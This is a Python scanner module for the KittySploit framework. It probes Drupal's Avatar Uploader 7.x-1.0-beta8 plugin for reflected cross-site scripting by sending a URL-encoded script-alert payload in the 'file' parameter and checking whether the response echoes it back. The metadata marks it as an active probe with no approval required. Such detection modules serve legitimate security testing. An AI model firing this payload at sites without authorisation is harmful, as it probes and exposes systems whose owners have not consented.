#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Drupal Avatar Uploader v7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Drupal Avatar Uploader - Cross-Site Scripting Detection',
        'description': 'Drupal Avatar Uploader v7.x-1.0-beta8 plugin contains a cross-site scripting vulnerability in the slider import search feature and tab parameter via plugin settings.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'drupal', 'edb', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50841',
            'https://packetstormsecurity.com/files/166409/Drupal-Avatar-Upload-7.x-1.0-beta8-Cross-Site-Scripting.html',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<div><script>alert(document.domain)</script></div>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Drupal Avatar Uploader - Cross-Site Scripting detected",
                path='/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E',
            )
            return True
        return False

